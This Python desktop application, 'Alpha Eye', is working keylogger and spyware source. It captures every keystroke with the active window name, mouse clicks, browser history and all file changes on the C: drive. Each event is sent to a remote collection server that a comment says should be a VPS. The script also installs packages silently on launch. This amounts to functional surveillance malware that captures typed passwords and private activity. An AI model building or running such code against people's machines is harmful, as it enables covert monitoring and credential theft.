import platform
import subprocess
import os
import sys
import tkinter as tk
from tkinter import ttk
from threading import Thread, Event
from pynput import keyboard, mouse
import psutil
from cryptography.fernet import Fernet
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
import win32gui
import time
import socket
from PIL import Image, ImageTk
import requests
from datetime import datetime

logo_path = 'AlphaEye.png'

# Generate a key for encryption and decryption
key = Fernet.generate_key()
cipher = Fernet(key)

# Initialize sentence storage
current_sentence = ""
active_window = ""

# Log buffers
user_logs = []
system_logs = []

# Get device name
device_name = socket.gethostname()

# Flags to control logging processes
keylogger_active = Event()
mouse_listener_active = Event()
filesystem_watcher_active = Event()
browser_monitor_active = Event()

def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)

# Usage
logo_path = resource_path('2.ico')
image_path = resource_path('img1.png')
requirements_path = resource_path('requirements.txt')

def install_package(pip_exe, package, extra_args=None):
    args = [pip_exe, 'install', package]
    if extra_args:
        args.extend(extra_args)
    subprocess.run(args, check=True)

def check_and_install_packages():
    if platform.system() == 'Windows':
        python_exe = 'python.exe'
        pip_exe = 'pip.exe'
        scripts_dir = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Python', 'Python312', 'Scripts')
        os.environ["PATH"] += os.pathsep + scripts_dir
    else:
        python_exe = 'python3'
        pip_exe = 'pip3'

    try:
        subprocess.run([python_exe, '--version'], check=True)
        print("Python is already installed.")
    except FileNotFoundError:
        print("Python is not installed. Please install Python first.")
        sys.exit(1)

    requirements_file = os.path.join(os.path.dirname(__file__), 'requirements.txt')
    if os.path.isfile(requirements_file):
        try:
            subprocess.run([pip_exe, 'install', '--quiet', '-r', requirements_file], check=True)
            print("All required packages are installed.")
        except subprocess.CalledProcessError:
            print("An error occurred while installing the packages.")
            sys.exit(1)
    else:
        print("requirements.txt file not found. Please ensure it is in the same directory as this script.")
        sys.exit(1)

check_and_install_packages()

def get_active_window():
    try:
        return win32gui.GetWindowText(win32gui.GetForegroundWindow())
    except Exception as e:
        print(f"Failed to get active window: {e}")
        return "Unknown"

def send_log(log, device_name):
    url = "http://localhost:60000/api_alpha"  # Change to your VPS URL
    data = {'log': log, 'device_name': device_name}
    try:
        response = requests.post(url, data=data)
        print("Log sent, server responded with:", response.text)
    except requests.exceptions.RequestException as e:
        print("Failed to send log:", e)

def update_log(event_type, event_details, log_type='system'):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f"{timestamp} - {event_type}: {event_details}\n"
    send_log(log_entry, device_name)
    if log_type == 'user':
        user_logs.append(log_entry)
        show_user_logs()  # Update user logs frame
        print(f"User log updated: {log_entry}")  # Debugging statement
    else:
        system_logs.append(log_entry)
        show_system_logs()  # Update system logs frame
        print(f"System log updated: {log_entry}")  # Debugging statement

def on_press(key):
    global current_sentence
    global active_window
    try:
        char = key.char
    except AttributeError:
        char = str(key)

    if char == 'Key.space':
        char = ' '
    elif char == 'Key.enter':
        update_log("Typed", f"{current_sentence} in {active_window}", log_type='user')
        current_sentence = ""
        return
    elif char == 'Key.backspace':
        current_sentence += '(deleted)'  # Add a marker for Backspace
        return
    elif char.startswith("Key."):
        return

    current_sentence += char
    active_window = get_active_window()

def on_click(x, y, button, pressed):
    if pressed:
        active_window = get_active_window()
        update_log("Mouse Clicked", f"Button {button} at ({x}, y) in {active_window}", log_type='user')

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as kl:
        while keylogger_active.is_set():
            time.sleep(0.1)

def start_mouse_listener():
    with mouse.Listener(on_click=on_click) as ml:
        while mouse_listener_active.is_set():
            time.sleep(0.1)

class FileSystemHandler(FileSystemEventHandler):
    def on_created(self, event):
        event_type = "Folder" if event.is_directory else "File"
        update_log("Created", f"{event_type} created: {event.src_path}", log_type='system')

    def on_deleted(self, event):
        event_type = "Folder" if event.is_directory else "File"
        update_log("Deleted", f"{event_type} deleted: {event.src_path}", log_type='system')

    def on_modified(self, event):
        event_type = "Folder" if event.is_directory else "File"
        update_log("Modified", f"{event_type} modified: {event.src_path}", log_type='system')

    def on_moved(self, event):
        event_type = "Folder" if event.is_directory else "File"
        update_log("Moved", f"{event_type} moved: from {event.src_path} to {event.dest_path}", log_type='system')

def start_filesystem_watcher():
    event_handler = FileSystemHandler()
    observer = Observer()
    observer.schedule(event_handler, path='C:\\', recursive=True)
    observer.start()
    while filesystem_watcher_active.is_set():
        time.sleep(1)
    observer.stop()
    observer.join()

def monitor_browser_activity():
    import browserhistory as bh
    while browser_monitor_active.is_set():
        history = bh.get_browserhistory()
        for browser, hist in history.items():
            for entry in hist:
                update_log("Browser Activity", f"{browser} - {entry[0]}: {entry[1]}", log_type='user')
        time.sleep(60)

user_logs = []  # Placeholder for user logs
system_logs = []  # Placeholder for system logs

def setup_main_frame():
    main_frame.pack(expand=True, fill=tk.BOTH)

    image_path = os.path.join(os.path.dirname(__file__), 'img1.png')
    if os.path.exists(image_path):
        img = Image.open(image_path)
        img = img.resize((400, 350), Image.LANCZOS)
        img = ImageTk.PhotoImage(img)
        image_label = tk.Label(main_frame, image=img, bg="#000000")
        image_label.image = img  # Keep a reference to avoid garbage collection
        image_label.pack(pady=20)
    else:
        print(f"Image file not found at: {image_path}")

    choice_label = tk.Label(main_frame, text="Your choice", font=("Arial", 14), fg="#FFFFFF", bg="#000000")
    choice_label.pack(pady=10)

    user_logs_button = tk.Button(main_frame, text="User Logs", command=lambda: (start_user_logs(), show_user_logs()), bg="#FF0000", fg="#FFFFFF", font=("Arial", 12), width=20, height=2)
    user_logs_button.pack(pady=5)

    system_logs_button = tk.Button(main_frame, text="System Logs", command=lambda: (start_system_logs(), show_system_logs()), bg="#FF0000", fg="#FFFFFF", font=("Arial", 12), width=20, height=2)
    system_logs_button.pack(pady=5)

def setup_user_logs_frame():
    log_text_user.config(state=tk.NORMAL)
    log_text_user.delete(1.0, tk.END)
    log_text_user.insert(tk.END, "User Logs will be shown here...\n", "bold_centered")
    log_text_user.tag_configure("bold_centered", justify='center', font=("Arial", 12, "bold"))
    log_text_user.tag_add("bold_centered", 1.0, "end")
    log_text_user.config(state=tk.DISABLED)

def setup_system_logs_frame():
    log_text_system.config(state=tk.NORMAL)
    log_text_system.delete(1.0, tk.END)
    log_text_system.insert(tk.END, "System Logs will be shown here...\n", "bold_centered")
    log_text_system.tag_configure("bold_centered", justify='center', font=("Arial", 12, "bold"))
    log_text_system.tag_add("bold_centered", 1.0, "end")
    log_text_system.config(state=tk.DISABLED)

def show_user_logs():
    main_frame.pack_forget()
    user_logs_frame.pack(expand=True, fill=tk.BOTH)
    log_text_user.config(state=tk.NORMAL)
    log_text_user.delete(1.0, tk.END)
    log_text_user.insert(tk.END, "User Logs will be shown here...\n", "bold_centered")
    log_text_user.tag_configure("bold_centered", justify='center', font=("Arial", 12, "bold"))
    log_text_user.tag_add("bold_centered", 1.0, "end")
    log_text_user.insert(tk.END, "\n".join(user_logs))
    log_text_user.yview_moveto(1.0)  # Scroll to the end
    log_text_user.config(state=tk.DISABLED)

def show_system_logs():
    main_frame.pack_forget()
    system_logs_frame.pack(expand=True, fill=tk.BOTH)
    log_text_system.config(state=tk.NORMAL)
    log_text_system.delete(1.0, tk.END)
    log_text_system.insert(tk.END, "System Logs will be shown here...\n", "bold_centered")
    log_text_system.tag_configure("bold_centered", justify='center', font=("Arial", 12, "bold"))
    log_text_system.tag_add("bold_centered", 1.0, "end")
    log_text_system.insert(tk.END, "\n".join(system_logs))
    log_text_system.yview_moveto(1.0)  # Scroll to the end
    log_text_system.config(state=tk.DISABLED)

def back_to_main():
    user_logs_frame.pack_forget()
    system_logs_frame.pack_forget()
    main_frame.pack(expand=True, fill=tk.BOTH)
    stop_logging()

def stop_logging():
    # Stop logging threads and listeners
    keylogger_active.clear()
    mouse_listener_active.clear()
    filesystem_watcher_active.clear()
    browser_monitor_active.clear()

def start_user_logs():
    keylogger_active.set()
    mouse_listener_active.set()
    browser_monitor_active.set()
    Thread(target=start_keylogger, daemon=True).start()
    Thread(target=start_mouse_listener, daemon=True).start()
    Thread(target=monitor_browser_activity, daemon=True).start()

def start_system_logs():
    filesystem_watcher_active.set()
    Thread(target=start_filesystem_watcher, daemon=True).start()

def save_logs_to_file(logs, filename):
    with open(filename, 'w') as file:
        file.write("\n".join(logs))

def download_user_logs():
    save_logs_to_file(user_logs, "user_logs.txt")

def download_system_logs():
    save_logs_to_file(system_logs, "system_logs.txt")

root = tk.Tk()
root.title("Alpha Eye")
root.geometry("700x600")  # Increased the width to 800 pixels
root.configure(bg="#000000")

main_frame = tk.Frame(root, bg="#000000")
user_logs_frame = tk.Frame(root, bg="#000000")
system_logs_frame = tk.Frame(root, bg="#000000")

setup_main_frame()

style = ttk.Style()
style.configure("Black.TScrollbar", background="#000000", troughcolor="#000000", bordercolor="#000000", arrowcolor="#FFFFFF")

user_logs_scrollbar = ttk.Scrollbar(user_logs_frame, style="Black.Vertical.TScrollbar")
user_logs_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
log_text_user = tk.Text(user_logs_frame, state=tk.DISABLED, bg="#000000", fg="#FFFFFF", font=("Arial", 12), wrap=tk.WORD, yscrollcommand=user_logs_scrollbar.set)
log_text_user.pack(expand=True, fill=tk.BOTH, padx=10, pady=10)
user_logs_scrollbar.config(command=log_text_user.yview)
setup_user_logs_frame()

system_logs_scrollbar = ttk.Scrollbar(system_logs_frame, style="Black.Vertical.TScrollbar")
system_logs_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
log_text_system = tk.Text(system_logs_frame, state=tk.DISABLED, bg="#000000", fg="#FFFFFF", font=("Arial", 12), wrap=tk.WORD, yscrollcommand=system_logs_scrollbar.set)
log_text_system.pack(expand=True, fill=tk.BOTH, padx=10, pady=10)
system_logs_scrollbar.config(command=log_text_system.yview)
setup_system_logs_frame()

back_button_user = tk.Button(user_logs_frame, text="Back", command=back_to_main, bg="#FF0000", fg="#FFFFFF", font=("Arial", 12), width=20, height=2)
back_button_user.pack(pady=10)

download_user_button = tk.Button(user_logs_frame, text="Download User Logs", command=download_user_logs, bg="#00FF00", fg="#FFFFFF", font=("Arial", 12), width=20, height=2)
download_user_button.pack(pady=10)

back_button_system = tk.Button(system_logs_frame, text="Back", command=back_to_main, bg="#FF0000", fg="#FFFFFF", font=("Arial", 12), width=20, height=2)
back_button_system.pack(pady=10)

download_system_button = tk.Button(system_logs_frame, text="Download System Logs", command=download_system_logs, bg="#00FF00", fg="#FFFFFF", font=("Arial", 12), width=20, height=2)
download_system_button.pack(pady=10)

root.mainloop()
